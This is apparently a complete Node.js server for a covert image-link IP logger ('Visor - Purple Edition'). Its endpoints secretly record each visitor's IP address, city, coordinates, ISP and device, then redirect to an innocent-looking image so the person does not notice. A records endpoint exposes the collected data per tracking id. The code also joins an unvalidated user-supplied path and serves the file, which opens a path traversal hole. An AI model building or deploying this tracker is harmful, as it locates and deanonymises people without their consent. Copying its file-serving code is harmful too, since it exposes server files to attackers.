const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

const DB_FILE = 'database.json';

function leerDB() {
    try {
        if (!fs.existsSync(DB_FILE)) {
            fs.writeFileSync(DB_FILE, JSON.stringify({}));
            return {};
        }
        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
    } catch { return {}; }
}

function guardarDB(data) {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] ||
        req.headers['cf-connecting-ip'] ||
        req.connection.remoteAddress ||
        '0.0.0.0';
}

async function getGeoLocation(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,lat,lon,isp`);
        const data = await response.json();
        if (data.status === 'success') {
            return {
                pais: data.country || 'Desconocido',
                codigoPais: data.countryCode || '??',
                region: data.regionName || 'Desconocido',
                ciudad: data.city || 'Desconocido',
                lat: data.lat || 0,
                lon: data.lon || 0,
                isp: data.isp || 'Desconocido'
            };
        }
    } catch (error) { }
    return {
        pais: 'Desconocido',
        codigoPais: '??',
        region: 'Desconocido',
        ciudad: 'Desconocido',
        lat: 0,
        lon: 0,
        isp: 'Desconocido'
    };
}

// ============================================================
//  🔥 ENDPOINT PRINCIPAL - SOLO REDIRIGE A LA IMAGEN
//  ¡SIN LETRAS, SIN TEXTO, SOLO LA IMAGEN!
// ============================================================
app.get('/i/:rid/:nombreImagen', async (req, res) => {
    const { rid, nombreImagen } = req.params;
    const { device } = req.query;

    let imgUrl;
    try {
        imgUrl = Buffer.from(nombreImagen.split('.')[0], 'base64').toString('utf-8');
    } catch (e) {
        return res.redirect('https://via.placeholder.com/400x300/1a0a2e/6ee7b7?text=Imagen+no+valida');
    }

    if (!rid || !imgUrl) {
        return res.redirect('https://via.placeholder.com/400x300/1a0a2e/6ee7b7?text=Error');
    }

    // ============ REGISTRAR VISITA (en segundo plano) ============
    try {
        let deviceInfo = {};
        if (device) {
            try {
                deviceInfo = JSON.parse(decodeURIComponent(device));
            } catch (e) {}
        }

        const ip = getClientIP(req);
        const userAgent = req.headers['user-agent'] || 'Desconocido';
        const date = new Date().toISOString().replace('T', ' ').slice(0, 19);
        const geo = await getGeoLocation(ip);

        const db = leerDB();
        if (!db[rid]) db[rid] = [];

        db[rid].push({
            ip: ip,
            date: date,
            pais: geo.pais,
            region: geo.region,
            ciudad: geo.ciudad,
            coords: `${geo.lat}, ${geo.lon}`,
            dispositivo: deviceInfo.tipo || userAgent,
            imagen: imgUrl
        });
        guardarDB(db);
    } catch (e) {
        console.error('Error registrando visita:', e);
    }

    // ============ REDIRIGIR SIEMPRE A LA IMAGEN ============
    if (imgUrl.startsWith('http://') || imgUrl.startsWith('https://')) {
        return res.redirect(imgUrl);
    }

    const imagePath = path.join(__dirname, imgUrl);
    if (fs.existsSync(imagePath)) {
        return res.sendFile(imagePath);
    }

    res.redirect('https://via.placeholder.com/400x300/1a0a2e/6ee7b7?text=Imagen+no+encontrada');
});

// ============ ENDPOINT ORIGINAL ============
app.get('/api/i', async (req, res) => {
    const { rid, img } = req.query;

    if (!rid || !img) {
        return res.redirect('https://via.placeholder.com/400x300/1a0a2e/6ee7b7?text=Error');
    }

    const ip = getClientIP(req);
    const userAgent = req.headers['user-agent'] || 'Desconocido';
    const date = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const geo = await getGeoLocation(ip);

    const db = leerDB();
    if (!db[rid]) db[rid] = [];

    db[rid].push({
        ip: ip,
        date: date,
        pais: geo.pais,
        region: geo.region,
        ciudad: geo.ciudad,
        coords: `${geo.lat}, ${geo.lon}`,
        dispositivo: userAgent,
        imagen: img
    });
    guardarDB(db);

    if (img.startsWith('http://') || img.startsWith('https://')) {
        return res.redirect(img);
    }

    const imagePath = path.join(__dirname, img);
    if (fs.existsSync(imagePath)) {
        return res.sendFile(imagePath);
    }

    res.redirect('https://via.placeholder.com/400x300/1a0a2e/6ee7b7?text=Imagen+no+encontrada');
});

// ============ OBTENER REGISTROS ============
app.get('/api/records/:rid', (req, res) => {
    const db = leerDB();
    const records = db[req.params.rid] || [];

    if (records.length === 0) {
        return res.status(404).json({ message: 'Sin registros' });
    }

    records.sort((a, b) => new Date(b.date) - new Date(a.date));
    res.json({
        rid: req.params.rid,
        count: records.length,
        records
    });
});

app.listen(PORT, () => {
    console.log(`✅ Servidor corriendo en puerto ${PORT}`);
    console.log(`🟣 Visor - Purple Edition v2.0`);
    console.log(`🔍 Detección de multicuentas activada`);
    console.log(`📌 Modo solo imagen (sin texto)`);
});